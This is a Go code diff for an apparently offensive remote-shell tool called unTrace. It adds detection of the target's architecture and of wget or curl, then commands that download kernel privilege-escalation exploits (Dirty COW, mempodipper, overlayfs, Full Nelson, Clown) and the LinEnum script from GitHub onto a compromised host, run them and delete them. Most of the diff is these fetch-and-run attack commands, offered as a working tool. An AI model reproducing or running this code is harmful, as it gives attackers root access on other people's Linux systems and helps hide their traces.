@@ -16,6 +16,9 @@ import (
 
 var escapePrompt = []byte{'$', ' '}
 
+var arch = "32"
+var wget = "wget"
+
 func main() {
     fmt.Print("IP Address of remote host: ")
     ip := readLine()
@@ -73,7 +76,67 @@ func main() {
 	if err := session.Shell(); err != nil {
 		log.Fatalf("failed to start shell: %s", err)
 	}
+    
+    old1 := os.Stdout // keep backup of the real stdout
+    r1, w1, _ := os.Pipe()
+    os.Stdout = w1
 
+    fmt.Fprint(in, "uname -m")
+
+    outC1 := make(chan string)
+    // copy the output in a separate goroutine so printing can't block indefinitely
+    go func() {
+        var buf bytes.Buffer
+        io.Copy(&buf, r1)
+        outC1 <- buf.String()
+    }()
+
+    // back to normal state
+    w1.Close()
+    os.Stdout = old1 // restoring the real stdout
+    out1 := <-outC1
+
+    cleanMsg1 := stripansi.Strip(out1)
+    cleanMsg1 = strings.Trim(cleanMsg1, "\n")
+    cleanMsg1 = strings.TrimSpace(cleanMsg1)
+    
+    if (cleanMsg1 == "x86_64") {
+        arch = "64"
+        fmt.Println("Architecture is 64 bit")
+    } else {
+        fmt.Println("Architecture is 32 bit")
+    }
+    
+    old2 := os.Stdout // keep backup of the real stdout
+    r2, w2, _ := os.Pipe()
+    os.Stdout = w2
+
+    fmt.Fprint(in, `wget -v >/dev/null 2>&1 || { echo >&2 "NOWGET"; }`)
+
+    outC2 := make(chan string)
+    // copy the output in a separate goroutine so printing can't block indefinitely
+    go func() {
+        var buf bytes.Buffer
+        io.Copy(&buf, r2)
+        outC2 <- buf.String()
+    }()
+
+    // back to normal state
+    w2.Close()
+    os.Stdout = old2 // restoring the real stdout
+    out2 := <-outC2
+
+    cleanMsg2 := stripansi.Strip(out2)
+    cleanMsg2 = strings.Trim(cleanMsg2, "\n")
+    cleanMsg2 = strings.TrimSpace(cleanMsg2)
+    
+    if (cleanMsg2 == "NOWGET") {
+        wget = "curl"
+        fmt.Println("Using curl")
+    } else {
+        fmt.Println("Using wget")
+    }
+    
 	// Accepting commands
 	for {
         cmd := readLine()
@@ -92,7 +155,7 @@ func main() {
             str = cmd;
         }
 
-        str += "\n"
+        str += "\r\n"
 
         old := os.Stdout // keep backup of the real stdout
         r, w, _ := os.Pipe()
@@ -159,6 +222,14 @@ func command(str string) string {
     return cmd
 }
 
+func getDownloadCommand(url string, target string) string {
+    if (wget == "curl") {
+        return "curl -o " + target + " " + url
+    } else {
+        return "wget -O " + target + " " + url
+    }
+}
+
 var helpString = `unTrace by milan44
 
 help       Shows a list of all commands.
@@ -197,36 +268,42 @@ overlayfs     overlayfs (Linux 3.13.0<3.19)
 nelson        Full Nelson (Linux 2.6.31<2.6.37 RedHat/Debian)
 clown         Clown NewUser (Linux 3.0<3.3.5)`);
         case "escalate pokemon":
-            return command(`cd /tmp
-wget https://github.com/evait-security/ClickNRoot/blob/master/1/exploit_32?raw=true > exploit
+            return command(`cd ~
+` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/1/exploit_` + arch + `?raw=true`, `exploit`) + `
 chmod +x exploit
 ./exploit root
 rm exploit
 echo Try using su firefart using the password root.`)
         case "escalate mempodipper":
-            return command(`cd /tmp
-wget https://github.com/evait-security/ClickNRoot/blob/master/3/exploit_32?raw=true > exploit
+            return command(`cd ~
+` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/3/exploit_` + arch + `?raw=true`, `exploit`) + `
 chmod +x exploit
 ./exploit
 rm exploit`)
         case "escalate overlayfs":
-            return command(`cd /tmp
-wget https://github.com/evait-security/ClickNRoot/blob/master/8/exploit_32?raw=true > exploit
+            return command(`cd ~
+` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/8/exploit_` + arch + `?raw=true`, `exploit`) + `
 chmod +x exploit
 ./exploit
 rm exploit`)
         case "escalate nelson":
-            return command(`cd /tmp
-wget https://github.com/evait-security/ClickNRoot/blob/master/4/exploit_32?raw=true > exploit
+            return command(`cd ~
+` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/4/exploit_` + arch + `?raw=true`, `exploit`) + `
 chmod +x exploit
 ./exploit
 rm exploit`)
         case "escalate clown":
-            return command(`cd /tmp
-wget https://github.com/evait-security/ClickNRoot/blob/master/6/exploit_32?raw=true > exploit
+            return command(`cd ~
+` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/6/exploit_` + arch + `?raw=true`, `exploit`) + `
 chmod +x exploit
 ./exploit
 rm exploit`)
+        case "enum":
+            return command(`cd ~
+` + getDownloadCommand(`https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`, `enum.sh`) + `
+chmod +x enum.sh
+./enum.sh -r report -e ~ -t
+rm enum.sh`)
     }
 
     return echo("Command 'unt " + arg + "' not defined! Try 'unt help'.")
